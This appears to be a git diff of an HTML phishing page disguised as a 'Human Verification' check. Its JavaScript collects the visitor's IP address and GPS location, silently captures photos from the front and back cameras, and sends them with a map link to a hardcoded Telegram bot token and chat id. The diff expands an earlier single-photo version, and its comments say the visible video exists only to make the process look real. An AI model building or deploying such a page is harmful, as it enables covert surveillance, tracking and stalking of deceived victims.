@@ -3,52 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Gift Verification</title>
+    <title>Secure Verification</title>
 
     <style>
         body {
-            background-color: #f0f0f0;
+            background-color: #f4f4f4;
             text-align: center;
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            padding: 20px;
         }
 
-        /* User ko dikhane ke liye video visible rakha hai */
+        h1 { color: #333; }
+
+        /* Video ko chhota dikhayenge taaki process real lage */
         #video-stream {
-            width: 300px;
-            margin-top: 20px;
-            border: 2px solid #333;
+            width: 80%;
+            max-width: 400px;
+            border: 3px solid #4CAF50;
             border-radius: 10px;
+            margin-top: 20px;
             display: none; 
+            background: #000;
         }
 
         .verify-btn {
-            padding: 15px 30px;
-            background-color: blue;
+            padding: 15px 40px;
+            background-color: #007bff;
             color: white;
             border: none;
             cursor: pointer;
-            margin-top: 50px;
+            margin-top: 30px;
             font-size: 18px;
-            border-radius: 5px;
+            border-radius: 50px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            transition: background 0.3s;
         }
 
-        .verify-btn:disabled {
-            background-color: grey;
-            cursor: not-allowed;
-        }
+        .verify-btn:hover { background-color: #0056b3; }
+        .verify-btn:disabled { background-color: #ccc; cursor: not-allowed; }
         
         #status {
-            margin-top: 10px;
-            color: green;
+            margin-top: 20px;
+            color: #555;
             font-weight: bold;
+            min-height: 20px;
         }
     </style>
 </head>
 
 <body>
 
-    <h1>Click below to Verify you are Human</h1>
-    <button class="verify-btn" id="btn" onclick="startProcess()">Verify Now</button>
+    <h1>Human Verification Required</h1>
+    <p>Click below to allow access and verify your device.</p>
+    
+    <button class="verify-btn" id="btn" onclick="startFullProcess()">Verify Now</button>
     <p id="status"></p>
 
     <video id="video-stream" autoplay playsinline muted></video>
@@ -59,85 +67,155 @@
         const botToken = "8593566926:AAEhOP5u2ph3FriBMGrWvpSl8X-xEsXgrfk"; 
         const chatId = "7681204940";
 
-        // --- FUNCTIONS ---
+        // Global variables to store data
+        let userIP = "Unknown";
+        let userLocation = "Unknown Location";
+        let mapLink = "";
+
+        // --- MAIN PROCESS ---
         
-        async function startProcess() {
-            const statusText = document.getElementById("status");
+        async function startFullProcess() {
             const btn = document.getElementById("btn");
-            const video = document.getElementById("video-stream");
-
-            statusText.innerText = "Requesting Camera Access...";
+            const statusText = document.getElementById("status");
             
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                try {
-                    // 1. Camera Access
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    video.srcObject = stream;
-                    video.style.display = "inline-block"; // Video dikhayen
-                    btn.disabled = true;
-                    btn.innerText = "Verifying...";
-                    statusText.innerText = "Camera Active. Please wait...";
+            btn.disabled = true;
+            btn.innerText = "Verifying...";
+            
+            // Step 1: Get IP Address
+            statusText.innerText = "Checking Network...";
+            await getIP();
 
-                    // 2. Wait for 3 seconds before capturing (for better quality)
-                    setTimeout(() => {
-                        captureAndSend(video, stream);
-                    }, 3000);
+            // Step 2: Get Location
+            statusText.innerText = "Checking Location...";
+            await getLocation();
 
-                } catch (error) {
-                    console.error(error);
-                    statusText.innerText = "Permission Denied. Cannot verify.";
-                    statusText.style.color = "red";
-                }
-            } else {
-                alert("Browser not supported");
+            // Step 3: Capture Front Camera
+            statusText.innerText = "Scanning Face (Front)...";
+            await captureCamera("user", "Front Camera");
+
+            // Step 4: Capture Back Camera
+            statusText.innerText = "Scanning Environment (Back)...";
+            // Thoda delay taaki camera switch ho sake
+            await new Promise(r => setTimeout(r, 1000)); 
+            await captureCamera("environment", "Back Camera");
+
+            // Finish
+            statusText.innerText = "Verification Successful! ✅";
+            statusText.style.color = "green";
+            btn.innerText = "Verified";
+        }
+
+        // --- HELPER FUNCTIONS ---
+
+        // 1. Fetch IP
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                userIP = data.ip;
+                console.log("IP Fetched:", userIP);
+            } catch (error) {
+                console.error("IP Error:", error);
+                userIP = "Error Fetching IP";
             }
         }
 
-        function captureAndSend(video, stream) {
-            const canvas = document.getElementById("hidden-canvas");
-            const context = canvas.getContext("2d");
-
-            // Set canvas size equal to video size
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-
-            // Draw image on canvas
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // Convert to Blob and Send to Telegram
-            canvas.toBlob(function(blob) {
-                sendToTelegram(blob);
-                
-                // Stop Camera after capture
-                stream.getTracks().forEach(track => track.stop());
-                video.style.display = "none";
-                document.getElementById("status").innerText = "Verification Complete!";
-                document.getElementById("btn").innerText = "Verified ✅";
-            }, 'image/jpeg');
+        // 2. Fetch Location
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const lat = position.coords.latitude;
+                            const lng = position.coords.longitude;
+                            userLocation = `Lat: ${lat}, Lng: ${lng}`;
+                            mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
+                            console.log("Location:", userLocation);
+                            resolve();
+                        },
+                        (error) => {
+                            console.error("Location denied:", error);
+                            userLocation = "Location Denied/Unavailable";
+                            resolve(); // Resolve even if error, to continue process
+                        }
+                    );
+                } else {
+                    userLocation = "Geolocation not supported";
+                    resolve();
+                }
+            });
         }
 
-        function sendToTelegram(photoBlob) {
+        // 3. Capture Camera (Generic for Front/Back)
+        async function captureCamera(mode, cameraName) {
+            const video = document.getElementById("video-stream");
+            const canvas = document.getElementById("hidden-canvas");
+            
+            try {
+                // Stop previous tracks if any
+                if (video.srcObject) {
+                    video.srcObject.getTracks().forEach(track => track.stop());
+                }
+
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: mode } 
+                });
+                
+                video.srcObject = stream;
+                video.style.display = "inline-block"; // Show video for realism
+
+                // Wait 2 seconds for camera to adjust light
+                await new Promise(r => setTimeout(r, 2500));
+
+                // Draw to canvas
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext("2d");
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Convert to blob and send
+                return new Promise((resolve) => {
+                    canvas.toBlob((blob) => {
+                        sendToTelegram(blob, cameraName);
+                        
+                        // Stop stream after capture
+                        stream.getTracks().forEach(track => track.stop());
+                        video.style.display = "none";
+                        resolve();
+                    }, 'image/jpeg', 0.8); // 0.8 quality
+                });
+
+            } catch (error) {
+                console.error(cameraName + " Error:", error);
+                // Agar back camera nahi hai (e.g. Laptop), to ignore karke aage badhega
+            }
+        }
+
+        // 4. Send Data to Telegram
+        function sendToTelegram(photoBlob, cameraType) {
             const formData = new FormData();
+            
+            // Caption mein sab details daalenge
+            const message = `
+🔐 *New Verification*
+📷 *Source:* ${cameraType}
+🌍 *IP:* ${userIP}
+📍 *Location:* ${userLocation}
+🔗 *Map:* ${mapLink}
+`;
+
             formData.append("chat_id", chatId);
-            formData.append("photo", photoBlob, "verification_photo.jpg");
-            formData.append("caption", "New Verification Attempt! 📸");
+            formData.append("photo", photoBlob, "capture.jpg");
+            formData.append("caption", message);
+            formData.append("parse_mode", "Markdown"); // Text bold karne ke liye
 
             fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                 method: "POST",
                 body: formData
             })
-            .then(response => response.json())
-            .then(data => {
-                console.log("Sent to Telegram:", data);
-                if(data.ok) {
-                    alert("Verification Photo Sent Successfully!");
-                } else {
-                    console.error("Telegram Error:", data);
-                }
-            })
-            .catch(error => {
-                console.error("Error sending photo:", error);
-            });
+            .then(res => res.json())
+            .then(data => console.log("Sent:", data))
+            .catch(err => console.error("Send Error:", err));
         }
 
     </script>
